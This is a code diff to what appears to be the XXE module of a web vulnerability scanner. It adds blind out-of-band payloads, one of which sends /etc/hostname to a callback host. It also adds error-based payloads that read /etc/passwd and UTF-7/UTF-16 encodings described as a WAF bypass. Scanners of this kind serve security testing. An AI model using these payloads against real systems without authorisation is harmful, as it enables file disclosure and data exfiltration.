@@ -1,4 +1,5 @@
 import re
+import asyncio
 from urllib.parse import urlparse
 from modules.base import BaseModule
 from core.utils import random_string
@@ -29,21 +30,135 @@ class XxeModule(BaseModule):
     
     async def scan(self, target):
         self.findings = []
+        self.oob_manager = self.config.get("oob_manager")
         callback_host = self.config.get("callback_host")
         
         await self._test_basic_xxe(target)
         await self._test_parameter_entity(target)
         await self._test_xxe_ssrf(target)
         
-        if callback_host:
+        if self.oob_manager:
+            await self._test_blind_xxe_oob(target)
+        elif callback_host:
             await self._test_oob_xxe(target, callback_host)
             await self._test_oob_data_exfil(target, callback_host)
         
         await self._test_xinclude(target)
         await self._test_svg_xxe(target)
-        await self._test_docx_xxe(target)
+        
+        if self.aggressive:
+            await self._test_xxe_error_based(target)
+            await self._test_utf_encoding_bypass(target)
         
         return self.findings
+    
+    async def _test_blind_xxe_oob(self, target):
+        token = self.oob_manager.generate_token()
+        http_callback = self.oob_manager.get_http_url(token)
+        dns_callback = self.oob_manager.get_dns_payload(token)
+        
+        blind_payloads = [
+            f'''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "{http_callback}">
+  %xxe;
+]><foo>test</foo>''',
+            f'''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "{http_callback}">
+]><foo>&xxe;</foo>''',
+            f'''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://{dns_callback}/">
+  %xxe;
+]><foo>test</foo>''',
+            f'''<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "{http_callback}">
+<foo>test</foo>''',
+            f'''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{http_callback}/?d=%file;'>">
+  %eval;
+  %exfil;
+]><foo>test</foo>''',
+        ]
+        
+        for payload in blind_payloads:
+            await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
+        
+        await asyncio.sleep(3)
+        
+        interactions = self.oob_manager.check_interactions(token)
+        if interactions:
+            interaction_type = interactions[0].get("type", "unknown")
+            self.add_finding(
+                "CRITICAL",
+                f"Blind XXE CONFIRMED via OOB ({interaction_type})",
+                url=target,
+                evidence=f"Callback received: {interactions[0]}",
+                confidence_evidence=["oob_callback_received", "blind_xxe_confirmed"],
+                request_data={"method": "POST", "url": target, "content_type": "application/xml"}
+            )
+            return True
+        return False
+    
+    async def _test_xxe_error_based(self, target):
+        error_payloads = [
+            '''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]><foo>test</foo>''',
+            '''<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://x]%file;'>">
+  %eval;
+  %exfil;
+]><foo>test</foo>''',
+        ]
+        
+        for payload in error_payloads:
+            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
+            if resp.get("status"):
+                text = resp.get("text", "")
+                for pattern in self.success_patterns:
+                    if re.search(pattern, text, re.IGNORECASE):
+                        self.add_finding(
+                            "CRITICAL",
+                            "XXE Error-based Data Extraction",
+                            url=target,
+                            evidence=f"File content leaked in error message",
+                            confidence_evidence=["error_based_xxe", "data_in_error"],
+                            request_data={"method": "POST", "url": target, "payload": "error-based"}
+                        )
+                        return
+    
+    async def _test_utf_encoding_bypass(self, target):
+        utf16_payload = '''<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>'''
+        
+        utf7_payload = '''<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo +AFs-+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4AXQ-+AD4-
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4-'''
+        
+        for payload, encoding in [(utf16_payload, "UTF-16"), (utf7_payload, "UTF-7")]:
+            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/xml"})
+            if resp.get("status"):
+                for pattern in self.success_patterns:
+                    if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
+                        self.add_finding(
+                            "CRITICAL",
+                            f"XXE via {encoding} Encoding Bypass",
+                            url=target,
+                            evidence="WAF bypass using alternate encoding",
+                            confidence_evidence=["encoding_bypass", "xxe_confirmed"]
+                        )
+                        return
     
     async def _test_basic_xxe(self, target):
         for file_path, os_type in self.files_to_read[:3]:
@@ -64,7 +179,9 @@ class XxeModule(BaseModule):
                                 "CRITICAL",
                                 f"XXE File Disclosure ({file_path})",
                                 url=target,
-                                evidence=f"Extracted: {extracted[:200]}"
+                                evidence=f"Extracted: {extracted[:200]}",
+                                confidence_evidence=["file_content_extracted", f"{os_type}_file_pattern"],
+                                request_data={"method": "POST", "url": target, "payload": payload[:100]}
                             )
                             return
     
